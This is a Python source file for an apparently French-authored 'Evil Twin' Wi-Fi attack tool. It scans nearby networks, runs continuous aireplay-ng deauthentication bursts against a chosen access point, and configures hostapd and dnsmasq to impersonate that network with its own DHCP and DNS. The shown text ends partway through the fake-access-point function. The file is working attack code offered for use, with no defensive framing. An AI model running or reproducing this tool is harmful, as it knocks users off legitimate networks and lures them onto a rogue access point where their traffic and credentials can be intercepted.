#!/usr/bin/env python3
"""
IPFighter v3.0 Enhanced - Evil Twin Wi-Fi Attack Tool
Corrected version with security fixes and improved error handling
"""

import os
import sys
import time
import signal
import subprocess
import threading
import re
import logging
import json
import shlex
from pathlib import Path
from typing import List, Tuple, Optional, Dict
from dataclasses import dataclass
from datetime import datetime

# === Configuration des couleurs ===
class Colors:
    """ANSI color codes"""
    RED = "\033[1;31m"
    ORANGE = "\033[1;33m"
    YELLOW = "\033[93m"
    GREEN = "\033[1;32m"
    BLUE = "\033[1;34m"
    CYAN = "\033[1;36m"
    MAGENTA = "\033[1;35m"
    WHITE = "\033[1;37m"
    RESET = "\033[0m"
    
    CLEAR_LINE = "\033[K"
    CURSOR_UP = "\033[A"

# === Configuration ===
class Config:
    """Configuration centralisée"""
    TEMP_DIR = "/tmp/ipfighter"
    LOG_FILE = "/tmp/ipfighter/ipfighter.log"
    CAPTURE_DIR = "/tmp/ipfighter/captures"
    GATEWAY_IP = "10.0.0.1"
    DHCP_RANGE = "10.0.0.10,10.0.0.100"
    DHCP_LEASE = "12h"
    SCAN_DURATION = 15
    DEFAULT_DEAUTH_DURATION = 30
    HOSTAPD_PASSWORD = "hackthisnetwork123"
    SUBPROCESS_TIMEOUT = 3
    
    # Fichiers temporaires sécurisés (générés dynamiquement)
    SCAN_FILE = None
    HOSTAPD_CONF = None
    DNSMASQ_CONF = None
    HOSTAPD_LOG = None
    
    @staticmethod
    def init_temp_files():
        """Initialise les fichiers temporaires de manière sécurisée"""
        Path(Config.TEMP_DIR).mkdir(parents=True, exist_ok=True)
        Path(Config.CAPTURE_DIR).mkdir(parents=True, exist_ok=True)
        
        Config.SCAN_FILE = os.path.join(Config.TEMP_DIR, "scan_ipf")
        Config.HOSTAPD_CONF = os.path.join(Config.TEMP_DIR, "hostapd.conf")
        Config.DNSMASQ_CONF = os.path.join(Config.TEMP_DIR, "dnsmasq.conf")
        Config.HOSTAPD_LOG = os.path.join(Config.TEMP_DIR, "hostapd.log")

# === Classes de données ===
@dataclass
class AccessPoint:
    """Représentation d'un point d'accès Wi-Fi"""
    bssid: str
    channel: str
    essid: str
    signal: str = "N/A"
    encryption: str = "Unknown"
    
    def __str__(self):
        return f"{self.essid:<20} | CH: {self.channel:<4} | {self.bssid} | Signal: {self.signal}"

# === Configuration du logging ===
def setup_logging():
    """Configure le système de logging centralisé"""
    Path(Config.TEMP_DIR).mkdir(parents=True, exist_ok=True)
    Path(Config.CAPTURE_DIR).mkdir(parents=True, exist_ok=True)
    
    logger = logging.getLogger('IPFighter')
    logger.setLevel(logging.DEBUG)
    
    # Éviter les handlers en double
    if logger.handlers:
        return logger
    
    # Fichier
    file_handler = logging.FileHandler(Config.LOG_FILE)
    file_handler.setLevel(logging.DEBUG)
    
    # Console
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)
    
    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)
    
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    return logger

logger = setup_logging()

# === Variables globales ===
active_processes = []
captured_clients: Dict[str, Dict] = {}
mon_iface_created = None

# === Gestion des signaux ===
def signal_handler(sig, frame):
    """Gère l'interruption (Ctrl+C)"""
    logger.warning("Interruption détectée. Nettoyage en cours...")
    print(f"\n{Colors.YELLOW}[!] Interruption détectée. Nettoyage...{Colors.RESET}")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def cleanup():
    """Nettoie tous les processus et fichiers"""
    global active_processes
    
    logger.info("Nettoyage des processus actifs...")
    
    for proc in active_processes:
        try:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=Config.SUBPROCESS_TIMEOUT)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()
        except Exception as e:
            logger.debug(f"Erreur lors de la fermeture d'un processus: {e}")
    
    active_processes.clear()
    
    # Nettoyer les fichiers temporaires
    if Config.SCAN_FILE:
        files_to_clean = [
            f"{Config.SCAN_FILE}-01.csv",
            f"{Config.SCAN_FILE}-01.cap",
            Config.HOSTAPD_CONF,
            Config.DNSMASQ_CONF,
            Config.HOSTAPD_LOG
        ]
        
        for file_path in files_to_clean:
            if file_path:
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                        logger.debug(f"Fichier supprimé: {file_path}")
                except OSError as e:
                    logger.error(f"Erreur lors de la suppression de {file_path}: {e}")

def require_root():
    """Vérifie que le script est exécuté en tant que root"""
    if os.geteuid() != 0:
        print(f"{Colors.RED}[-] Ce script doit être exécuté en tant que root !{Colors.RESET}")
        print(f"{Colors.ORANGE}[*] Utilisez: sudo python3 IPfighter.py{Colors.RESET}")
        sys.exit(1)

def banner():
    """Affiche le banner du programme"""
    os.system("clear")
    art = f"""{Colors.RED}
          
 ██▓ ██▓███       █████▒██▓  ▄████  ██░ ██ ▄▄▄█████▓▓█████  ██▀███     
▓██▒▓██░  ██▒   ▓██   ▒▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒   
▒██▒▓██░ ██▓▒   ▒████ ░▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒   
░██░▒██▄█▓▒ ▒   ░▓█▒  ░░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄     
░██░▒██▒ ░  ░   ░▒█░   ░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ ░▒████▒░██▓ ▒██▒   
░▓  ▒▓▒░ ░  ░    ▒ ░   ░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   ░░ ░  ░░ ░▒▓ ░▒▓░   
 ▒ ░░▒ ░         ░      ▒ ░  ░   ░  ▒ ░▒░ ░    ░     ░ ░  ░  ░▒ ░ ▒░   
 ▒ ░░░           ░ ░    ▒ ░░ ░   ░  ░  ░░ ░  ░         ░     ░░   ░    
{Colors.RESET}"""
    
    print(art)
    print(f"{Colors.ORANGE}        >>> IPFighter v3.0 Enhanced — Evil Twin Wi-Fi Tool <<<{Colors.RESET}")
    print(f"{Colors.CYAN}              Advanced Exploitation Framework by H8Laws{Colors.RESET}")
    print(f"{Colors.MAGENTA}                  Version 3.0 - Optimized Release{Colors.RESET}\n")
    
    logger.info("Banner affiché")

def execute_command(cmd: List[str], timeout: Optional[int] = None, 
                   capture_output: bool = False, shell: bool = False) -> Optional[str]:
    """
    Exécute une commande système avec gestion d'erreur améliorée
    
    Args:
        cmd: Commande à exécuter (liste ou string si shell=True)
        timeout: Timeout en secondes
        capture_output: Capturer la sortie
        shell: Utiliser le shell
    
    Returns:
        La sortie de la commande ou None
    """
    try:
        if shell and isinstance(cmd, str):
            # Si on capture_output=True, ne pas spécifier stderr
            if capture_output:
                result = subprocess.run(cmd, shell=True, capture_output=True,
                                      timeout=timeout, text=True)
            else:
                result = subprocess.run(cmd, shell=True,
                                      timeout=timeout, text=True)
        else:
            # Même logique pour les commandes en liste
            if capture_output:
                result = subprocess.run(cmd, capture_output=True, timeout=timeout,
                                      text=True, close_fds=True)
            else:
                result = subprocess.run(cmd, timeout=timeout,
                                      text=True, close_fds=True)
        
        # Log les erreurs si présent
        if result.returncode != 0:
            if hasattr(result, 'stderr') and result.stderr:
                logger.warning(f"Commande retourna {result.returncode}: {result.stderr.strip()}")
            elif capture_output:
                logger.warning(f"Commande retourna {result.returncode}")
        
        return result.stdout.strip() if capture_output else None
    
    except subprocess.TimeoutExpired:
        cmd_str = ' '.join(cmd) if isinstance(cmd, list) else cmd
        logger.warning(f"Timeout lors de l'exécution: {cmd_str}")
        return None
    except PermissionError:
        cmd_str = ' '.join(cmd) if isinstance(cmd, list) else cmd
        logger.error(f"Permissions insuffisantes pour exécuter: {cmd_str}")
        return None
    except FileNotFoundError:
        cmd_str = ' '.join(cmd) if isinstance(cmd, list) else cmd
        logger.error(f"Commande non trouvée: {cmd_str}")
        return None
    except Exception as e:
        logger.error(f"Erreur lors de l'exécution de la commande: {e}")
        return None

def check_dependencies() -> bool:
    """Vérifie que tous les outils nécessaires sont installés"""
    required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'hostapd', 'dnsmasq', 'iptables']
    missing_tools = []
    
    print(f"\n{Colors.CYAN}[*] Vérification des dépendances...{Colors.RESET}")
    
    for tool in required_tools:
        try:
            # Vérifier returncode au lieu de vérifier None
            result = subprocess.run(['which', tool], 
                                  capture_output=True, 
                                  text=True, 
                                  timeout=5)
            
            if result.returncode != 0:
                missing_tools.append(tool)
                print(f"{Colors.RED}  ✗ {tool} - NON INSTALLÉ{Colors.RESET}")
            else:
                print(f"{Colors.GREEN}  ✓ {tool}{Colors.RESET}")
                logger.debug(f"{tool} trouvé à: {result.stdout.strip()}")
        
        except subprocess.TimeoutExpired:
            missing_tools.append(tool)
            print(f"{Colors.RED}  ✗ {tool} - TIMEOUT{Colors.RESET}")
        except Exception as e:
            missing_tools.append(tool)
            print(f"{Colors.RED}  ✗ {tool} - ERREUR: {e}{Colors.RESET}")
    
    if missing_tools:
        logger.error(f"Dépendances manquantes: {', '.join(missing_tools)}")
        print(f"\n{Colors.RED}[-] Les outils suivants sont manquants: {', '.join(missing_tools)}{Colors.RESET}")
        print(f"{Colors.ORANGE}[!] Installez-les avec: sudo apt install {' '.join(missing_tools)}{Colors.RESET}")
        return False
    
    # Vérifier la version d'airmon-ng pour le support --no-kill
    try:
        result = subprocess.run(['airmon-ng', '--help'], 
                              capture_output=True, 
                              text=True, 
                              timeout=5)
        if '--no-kill' in result.stdout or '-N' in result.stdout:
            print(f"{Colors.GREEN}  ✓ airmon-ng supporte --no-kill (mode sécurisé){Colors.RESET}")
            logger.info("airmon-ng supporte --no-kill")
        else:
            print(f"{Colors.YELLOW}  ⚠ airmon-ng peut tuer des processus (version ancienne?){Colors.RESET}")
            logger.warning("airmon-ng ne supporte peut-être pas --no-kill")
    except subprocess.TimeoutExpired:
        logger.warning("Timeout lors de la vérification d'airmon-ng")
    except Exception as e:
        logger.warning(f"Erreur lors de la vérification d'airmon-ng: {e}")
    
    logger.info("Toutes les dépendances sont présentes")
    return True

def list_all_interfaces() -> List[Tuple[str, str]]:
    """Liste toutes les interfaces réseau (Wi-Fi + Ethernet + autres)
    
    Returns:
        Liste de tuples (nom_interface, type)
    """
    try:
        result = subprocess.run(
            "ip link show | grep '^[0-9]' | awk '{print $2}' | sed 's/:$//'",
            shell=True, capture_output=True, text=True, timeout=5
        )
        
        if result.returncode == 0 and result.stdout:
            interfaces = []
            for iface in result.stdout.strip().split('\n'):
                iface = iface.strip()
                if iface and iface != 'lo':  # Exclure loopback
                    # Déterminer le type d'interface
                    iface_type = get_interface_type(iface)
                    interfaces.append((iface, iface_type))
            
            logger.info(f"Interfaces trouvées: {interfaces}")
            return interfaces
        
        logger.debug(f"Aucune interface trouvée. stdout={result.stdout}")
        return []
    except subprocess.TimeoutExpired:
        logger.warning("Timeout lors de la récupération des interfaces")
        return []
    except Exception as e:
        logger.error(f"Erreur lors de la récupération des interfaces: {e}")
        return []

def get_interface_type(iface: str) -> str:
    """Détecte le type d'interface (Wi-Fi, Ethernet, etc.)
    
    Args:
        iface: Nom de l'interface
    
    Returns:
        Type d'interface
    """
    try:
        # Vérifier si c'est Wi-Fi
        result = subprocess.run(
            f"iw dev {iface} link 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=2
        )
        if result.returncode == 0:
            return "Wi-Fi"
        
        # Vérifier si c'est Ethernet/filaire
        result = subprocess.run(
            f"ethtool {iface} 2>/dev/null | grep -q 'Link detected'",
            shell=True, capture_output=True, text=True, timeout=2
        )
        if result.returncode == 0:
            return "Ethernet"
        
        # Vérifier le préfixe
        if iface.startswith(('wlan', 'wlp', 'wlo', 'ath')):
            return "Wi-Fi"
        elif iface.startswith(('eth', 'en', 'em')):
            return "Ethernet"
        
        return "Autre"
    except Exception:
        return "Autre"

def choose_internet_interface() -> Optional[str]:
    """Permet à l'utilisateur de choisir une interface pour Internet"""
    interfaces = list_all_interfaces()
    
    if not interfaces:
        logger.error("Aucune interface réseau détectée")
        print(f"{Colors.RED}[-] Aucune interface réseau détectée !{Colors.RESET}")
        return None
    
    print(f"\n{Colors.BLUE}[+] Interfaces réseau disponibles (Internet):{Colors.RESET}")
    for i, (iface, iface_type) in enumerate(interfaces):
        icon = "📡" if iface_type == "Wi-Fi" else "🔌" if iface_type == "Ethernet" else "⚙️"
        print(f"{Colors.YELLOW}  {i}.{Colors.RESET} {icon} {iface:<15} ({Colors.CYAN}{iface_type}{Colors.RESET})")
    
    while True:
        try:
            idx = int(input(f"\n{Colors.ORANGE}[?] Interface pour l'accès INTERNET : {Colors.RESET}"))
            if 0 <= idx < len(interfaces):
                selected, iface_type = interfaces[idx]
                logger.info(f"Interface Internet sélectionnée: {selected} ({iface_type})")
                return selected
            else:
                print(f"{Colors.RED}[-] Choix invalide ! Veuillez entrer un nombre entre 0 et {len(interfaces)-1}{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}[-] Entrée invalide ! Veuillez entrer un nombre.{Colors.RESET}")
        except KeyboardInterrupt:
            logger.info("Sélection d'interface annulée par l'utilisateur")
            return None

def list_wifi_interfaces() -> List[str]:
    """Liste les interfaces Wi-Fi disponibles"""
    try:
        result = subprocess.run(
            "iw dev | awk '$1==\"Interface\"{print $2}'",
            shell=True, capture_output=True, text=True, timeout=5
        )
        
        if result.returncode == 0 and result.stdout:
            interfaces = [iface.strip() for iface in result.stdout.split('\n') if iface.strip()]
            logger.info(f"Interfaces Wi-Fi trouvées: {interfaces}")
            return interfaces
        
        logger.debug(f"Aucune interface Wi-Fi trouvée. stdout={result.stdout}")
        return []
    except subprocess.TimeoutExpired:
        logger.warning("Timeout lors de la récupération des interfaces Wi-Fi")
        return []
    except Exception as e:
        logger.error(f"Erreur lors de la récupération des interfaces Wi-Fi: {e}")
        return []

def choose_attack_interface() -> Optional[str]:
    """Permet à l'utilisateur de choisir une interface pour l'attaque (Wi-Fi)"""
    interfaces = list_wifi_interfaces()
    
    if not interfaces:
        logger.error("Aucune interface Wi-Fi détectée")
        print(f"{Colors.RED}[-] Aucune interface Wi-Fi détectée !{Colors.RESET}")
        return None
    
    print(f"\n{Colors.BLUE}[+] Interfaces Wi-Fi disponibles (Attaque):{Colors.RESET}")
    for i, iface in enumerate(interfaces):
        print(f"{Colors.YELLOW}  {i}.{Colors.RESET} 📡 {iface}")
    
    while True:
        try:
            idx = int(input(f"\n{Colors.ORANGE}[?] Interface pour l'ATTAQUE (sera convertie en mode monitor) : {Colors.RESET}"))
            if 0 <= idx < len(interfaces):
                selected = interfaces[idx]
                logger.info(f"Interface d'attaque sélectionnée: {selected}")
                return selected
            else:
                print(f"{Colors.RED}[-] Choix invalide ! Veuillez entrer un nombre entre 0 et {len(interfaces)-1}{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}[-] Entrée invalide ! Veuillez entrer un nombre.{Colors.RESET}")
        except KeyboardInterrupt:
            logger.info("Sélection d'interface annulée par l'utilisateur")
            return None

def kill_conflicts():
    """Arrête les processus conflictuels SAUF NetworkManager"""
    print(f"\n{Colors.YELLOW}[*] Arrêt des processus conflictuels (sauf NetworkManager)...{Colors.RESET}")
    logger.info("Arrêt des processus conflictuels")
    
    conflicting_processes = ['wpa_supplicant', 'dhclient']
    
    for process in conflicting_processes:
        try:
            cmd = f"pkill -f {shlex.quote(process)}"
            execute_command(cmd, shell=True)
            logger.debug(f"Processus {process} arrêté")
            print(f"{Colors.GREEN}  ✓ {process} arrêté{Colors.RESET}")
        except Exception as e:
            logger.debug(f"Erreur lors de l'arrêt de {process}: {e}")
    
    time.sleep(1)
    print(f"{Colors.GREEN}[+] Processus conflictuels arrêtés{Colors.RESET}")
    print(f"{Colors.CYAN}[!] NetworkManager reste actif pour l'accès Internet{Colors.RESET}")

def start_monitor_airmon(interface: str) -> Optional[str]:
    """
    Démarre le mode monitor avec airmon-ng et détecte l'interface créée
    
    Args:
        interface: Interface à convertir
    
    Returns:
        Nom de l'interface monitor créée
    """
    global mon_iface_created
    
    print(f"\n{Colors.GREEN}[+] Conversion de {interface} en mode monitor via airmon-ng...{Colors.RESET}")
    logger.info(f"Conversion de {interface} en mode monitor avec airmon-ng")
    
    try:
        before = set(list_wifi_interfaces())
    except Exception:
        before = set()
    
    try:
        print(f"{Colors.YELLOW}[*] Utilisation du flag --no-kill pour préserver les services...{Colors.RESET}")
        result = subprocess.run(['airmon-ng', 'start', interface, '--no-kill'],
                              capture_output=True, timeout=15, text=True)
        
        logger.debug(f"Sortie airmon-ng: {result.stdout}")
        if result.stderr:
            logger.debug(f"Erreurs airmon-ng: {result.stderr}")
        
        # Parser la sortie pour trouver l'interface créée
        mon_iface = None
        match = re.search(r'\(\S+\)\s*->\s*(\S+)', result.stderr)
        if match:
            mon_iface = match.group(1).strip()
            logger.info(f"Interface détectée via parsing: {mon_iface}")
        
        time.sleep(3)
        
    except subprocess.TimeoutExpired:
        logger.warning("Timeout lors du démarrage d'airmon-ng")
        mon_iface = None
        time.sleep(2)
    except Exception as e:
        logger.error(f"Erreur lors du démarrage d'airmon-ng: {e}")
        print(f"{Colors.RED}[-] Erreur: {e}{Colors.RESET}")
        return None
    
    # Si parsing échoué, chercher par différence d'interfaces
    if not mon_iface:
        try:
            time.sleep(1)
            after = set(list_wifi_interfaces())
            new_ifaces = list(after - before)
            
            for iface in new_ifaces:
                if "mon" in iface.lower():
                    mon_iface = iface
                    logger.info(f"Interface monitor détectée par différence: {mon_iface}")
                    break
            
            if not mon_iface and new_ifaces:
                mon_iface = new_ifaces[0]
                logger.info(f"Interface détectée (sans 'mon'): {mon_iface}")
        
        except Exception as e:
            logger.warning(f"Erreur lors de la détection d'interface: {e}")
    
    # Fallback final
    if not mon_iface:
        candidates = [iface for iface in list_wifi_interfaces() if "mon" in iface.lower() and iface != interface]
        if candidates:
            mon_iface = candidates[0]
            logger.warning(f"Interface monitor trouvée en cherchant toutes les interfaces: {mon_iface}")
        else:
            logger.error("Impossible de trouver une interface monitor")
            return None
    
    if mon_iface:
        print(f"{Colors.GREEN}[+] Interface monitor créée/détectée : {mon_iface}{Colors.RESET}")
        logger.info(f"Interface monitor finale: {mon_iface}")
        mon_iface_created = mon_iface
        return mon_iface
    
    print(f"{Colors.RED}[-] Impossible de créer une interface monitor{Colors.RESET}")
    logger.error("Impossible de créer une interface monitor")
    return None

def restore_network(mon_iface: Optional[str] = None):
    """Restaure les services réseau sans tuer NetworkManager"""
    print(f"\n{Colors.GREEN}[+] Restauration du réseau...{Colors.RESET}")
    logger.info("Restauration du réseau")
    
    if mon_iface:
        try:
            print(f"{Colors.YELLOW}[*] Arrêt de l'interface monitor {mon_iface} avec airmon-ng...{Colors.RESET}")
            subprocess.run(['airmon-ng', 'stop', mon_iface],
                         capture_output=True, timeout=10)
            logger.info(f"Interface monitor {mon_iface} arrêtée")
            time.sleep(2)
        except subprocess.TimeoutExpired:
            logger.warning(f"Timeout lors de l'arrêt de {mon_iface}")
        except Exception as e:
            logger.warning(f"Erreur lors de l'arrêt de l'interface monitor: {e}")
    
    try:
        print(f"{Colors.YELLOW}[*] Redémarrage de NetworkManager...{Colors.RESET}")
        subprocess.run(['systemctl', 'restart', 'NetworkManager'],
                     capture_output=True, timeout=10)
        logger.info("NetworkManager redémarré")
        time.sleep(3)
    except subprocess.TimeoutExpired:
        logger.warning("Timeout lors du redémarrage de NetworkManager")
    except Exception as e:
        logger.warning(f"Erreur lors du redémarrage de NetworkManager: {e}")
    
    print(f"{Colors.YELLOW}[*] Nettoyage des règles iptables...{Colors.RESET}")
    iptables_commands = [
        "iptables --flush",
        "iptables --table nat --flush",
        "iptables --delete-chain 2>/dev/null || true",
        "iptables --table nat --delete-chain 2>/dev/null || true",
        "echo 0 > /proc/sys/net/ipv4/ip_forward"
    ]
    
    for cmd in iptables_commands:
        try:
            execute_command(cmd, shell=True)
            logger.debug(f"Commande iptables exécutée: {cmd}")
        except Exception as e:
            logger.debug(f"Erreur lors de l'exécution de {cmd}: {e}")
    
    print(f"{Colors.GREEN}[+] Réseau restauré{Colors.RESET}")

def scan_aps(mon_iface: str, duration: int = Config.SCAN_DURATION) -> List[AccessPoint]:
    """
    Scanne les points d'accès Wi-Fi avec retry logic robuste
    
    Args:
        mon_iface: Interface en mode monitor
        duration: Durée du scan en secondes
    
    Returns:
        Liste des points d'accès détectés
    """
    print(f"\n{Colors.YELLOW}[+] Scan des réseaux Wi-Fi pendant {duration} secondes...{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Appuyez sur Ctrl+C pour arrêter plus tôt{Colors.RESET}")
    logger.info(f"Début du scan sur {mon_iface} pour {duration}s")
    
    # Nettoyer les anciens fichiers
    for file_path in [f"{Config.SCAN_FILE}-01.csv", f"{Config.SCAN_FILE}-01.cap"]:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except OSError:
            pass
    
    cmd = [
        'airodump-ng',
        '--write-interval', '1',
        '--write', Config.SCAN_FILE,
        '--output-format', 'csv',
        mon_iface
    ]
    
    proc = None
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                               close_fds=True)
        active_processes.append(proc)
        
        time.sleep(duration)
        
        proc.terminate()
        try:
            proc.wait(timeout=Config.SUBPROCESS_TIMEOUT)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
        
        if proc in active_processes:
            active_processes.remove(proc)
    except Exception as e:
        logger.error(f"Erreur lors du scan: {e}")
        if proc and proc.poll() is None:
            proc.kill()
        return []
    
    # Parser les résultats
    aps = []
    csv_file = f"{Config.SCAN_FILE}-01.csv"
    
    # Attendre que le fichier soit écrit et non vide
    retry_count = 0
    while (not os.path.exists(csv_file) or os.path.getsize(csv_file) == 0) and retry_count < 5:
        time.sleep(0.5)
        retry_count += 1
    
    if not os.path.exists(csv_file):
        logger.error("Fichier de scan introuvable après retry")
        print(f"{Colors.RED}[-] Fichier de scan introuvable !{Colors.RESET}")
        return aps
    
    if os.path.getsize(csv_file) == 0:
        logger.warning("Fichier de scan vide - aucun AP détecté")
        print(f"{Colors.YELLOW}[-] Aucun AP détecté (fichier vide){Colors.RESET}")
        return aps
    
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()
            lines = content.splitlines()
            ap_section = False
            
            for line in lines:
                if 'BSSID' in line and 'ESSID' in line:
                    ap_section = True
                    continue
                
                if ap_section and 'Station MAC' in line:
                    break
                
                if ap_section and line.strip():
                    fields = [field.strip() for field in line.split(',')]
                    
                    if len(fields) >= 14:
                        try:
                            bssid = fields[0]
                            channel = fields[3]
                            essid = fields[13]
                            signal = fields[4] if len(fields) > 4 else "N/A"
                            
                            if essid and bssid and bssid.count(':') == 5:
                                ap = AccessPoint(bssid, channel, essid, signal)
                                aps.append(ap)
                        except (IndexError, ValueError):
                            continue
    
    except (IOError, OSError) as e:
        logger.error(f"Erreur lors de la lecture du CSV: {e}")
    except Exception as e:
        logger.error(f"Erreur inattendue lors du parsing: {e}")
    
    logger.info(f"{len(aps)} points d'accès détectés")
    return aps

def select_ap(aps: List[AccessPoint]) -> Optional[AccessPoint]:
    """Permet de sélectionner un point d'accès cible"""
    if not aps:
        return None
    
    print(f"\n{Colors.BLUE}{'='*80}{Colors.RESET}")
    print(f"{Colors.BLUE}   NUM   {'ESSID':<25} {'CH':>4}  {'SIGNAL':>8}  BSSID{Colors.RESET}")
    print(f"{Colors.BLUE}{'-'*80}{Colors.RESET}")
    
    for i, ap in enumerate(aps):
        print(f"{Colors.YELLOW}  {i:<4}{Colors.RESET}  {Colors.CYAN}{ap.essid[:25]:<25}{Colors.RESET}  "
              f"{Colors.YELLOW}{ap.channel:>4}{Colors.RESET}  {Colors.GREEN}{ap.signal:>8}{Colors.RESET}  "
              f"{Colors.BLUE}{ap.bssid}{Colors.RESET}")
    
    print(f"{Colors.BLUE}{'='*80}{Colors.RESET}")
    
    while True:
        try:
            idx = int(input(f"\n{Colors.ORANGE}[?] Sélectionnez l'AP cible (0-{len(aps)-1}) : {Colors.RESET}"))
            if 0 <= idx < len(aps):
                selected = aps[idx]
                logger.info(f"AP sélectionné: {selected.essid} ({selected.bssid})")
                return selected
            else:
                print(f"{Colors.RED}[-] Choix invalide !{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}[-] Veuillez entrer un nombre valide{Colors.RESET}")
        except KeyboardInterrupt:
            logger.info("Sélection d'AP annulée")
            return None

def aggressive_deauth(mon_iface: str, bssid: str, duration: int = Config.DEFAULT_DEAUTH_DURATION):
    """
    Lance une attaque de déauthentification agressive
    
    Args:
        mon_iface: Interface en mode monitor
        bssid: BSSID cible
        duration: Durée en secondes
    """
    print(f"\n{Colors.RED}[+] Attaque de déauthentification agressive pendant {duration}s...{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Cible : {bssid}{Colors.RESET}")
    logger.info(f"Démarrage de la déauth agressive vers {bssid} pour {duration}s")
    
    end_time = time.time() + duration
    deauth_count = 0
    start_time = time.time()
    
    try:
        while time.time() < end_time:
            try:
                proc = subprocess.Popen(
                    ['aireplay-ng', '--deauth', '10', '-a', bssid, mon_iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    close_fds=True
                )
                active_processes.append(proc)
                deauth_count += 1
                
                time.sleep(0.5)
                
                proc.terminate()
                try:
                    proc.wait(timeout=Config.SUBPROCESS_TIMEOUT)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()
                
                if proc in active_processes:
                    active_processes.remove(proc)
                
                if deauth_count % 10 == 0:
                    remaining = int(end_time - time.time())
                    elapsed = int(time.time() - start_time)
                    print(f"{Colors.CYAN}[*] Déauth: {deauth_count} salves | "
                          f"Temps: {elapsed}s / {duration}s | Restant: {remaining}s{Colors.RESET}")
            
            except KeyboardInterrupt:
                raise
            except Exception as e:
                logger.warning(f"Erreur lors de la déauth: {e}")
                time.sleep(0.2)
        
        elapsed = int(time.time() - start_time)
        print(f"{Colors.GREEN}[+] Déauthentification terminée. Total: {deauth_count} salves en {elapsed}s{Colors.RESET}")
        logger.info(f"Déauth terminée: {deauth_count} salves")
    
    except KeyboardInterrupt:
        logger.info("Déauth interrompue par l'utilisateur")
        raise

def create_fake_ap(mon_iface: str, ssid: str, channel: str, 
                  force_wpa: bool = True) -> Tuple[Optional[subprocess.Popen], Optional[subprocess.Popen]]:
    """
    Crée un faux point d'accès avec hostapd et dnsmasq
    
    Args:
        mon_iface: Interface monitor
        ssid: SSID du faux AP
        channel: Canal Wi-Fi
        force_wpa: Forcer WPA2
    
    Returns:
        Tuple (hostapd_process, dnsmasq_process)
    """
    print(f"\n{Colors.GREEN}[+] Création du faux AP '{ssid}' sur le canal {channel}...{Colors.RESET}")
    logger.info(f"Création du faux AP: SSID={ssid}, Canal={channel}")
    
    for tool in ['hostapd', 'dnsmasq']:
        result = subprocess.run(['which', tool], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"{Colors.RED}[-] {tool} n'est pas installé !{Colors.RESET}")
            return None, None
    
    log_file = None
    try:
        execute_command(['iwconfig', mon_iface, 'channel', str(channel)])
        
        # Configuration hostapd avec paramètres améliorés
        hostapd_conf = f"""interface={mon_iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
wmm_enabled=1
ieee80211d=0
"""
        
        if force_wpa:
            print(f"\n{Colors.CYAN}[*] Configuration WPA2 pour capturer les tentatives...{Colors.RESET}")
            hostapd_conf += f"""auth_algs=1
wpa=2
wpa_passphrase={Config.HOSTAPD_PASSWORD}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_pairwise=CCMP
"""
            print(f"{Colors.YELLOW}[!] Mot de passe du réseau: {Config.HOSTAPD_PASSWORD}{Colors.RESET}")
        
        with open(Config.HOSTAPD_CONF, 'w') as f:
            f.write(hostapd_conf)
        
        logger.debug(f"Configuration hostapd écrite: {Config.HOSTAPD_CONF}")
        
        print(f"{Colors.YELLOW}[*] Configuration de l'interface {mon_iface}...{Colors.RESET}")
        execute_command(['ip', 'link', 'set', mon_iface, 'up'])
        execute_command(['ip', 'addr', 'add', f"{Config.GATEWAY_IP}/24", 'dev', mon_iface])
        
        dnsmasq_conf = f"""interface={mon_iface}
dhcp-range={Config.DHCP_RANGE},{Config.DHCP_LEASE}
dhcp-option=3,{Config.GATEWAY_IP}
dhcp-option=6,{Config.GATEWAY_IP}
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
bind-interfaces
"""
        
        with open(Config.DNSMASQ_CONF, 'w') as f:
            f.write(dnsmasq_conf)
        
        logger.debug(f"Configuration dnsmasq écrite: {Config.DNSMASQ_CONF}")
        
        print(f"{Colors.GREEN}[+] Démarrage de hostapd...{Colors.RESET}")
        log_file = open(Config.HOSTAPD_LOG, 'w')
        hostapd_proc = subprocess.Popen(
            ['hostapd', Config.HOSTAPD_CONF],
            stdout=log_file, stderr=subprocess.STDOUT, close_fds=True
        )
        active_processes.append(hostapd_proc)
        time.sleep(2)
        logger.info("hostapd démarré")
        
        print(f"{Colors.GREEN}[+] Démarrage de dnsmasq...{Colors.RESET}")
        dnsmasq_proc = subprocess.Popen(
            ['dnsmasq', '-C', Config.DNSMASQ_CONF, '-d'],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            close_fds=True
        )
        active_processes.append(dnsmasq_proc)
        time.sleep(1)
        logger.info("dnsmasq démarré")
        
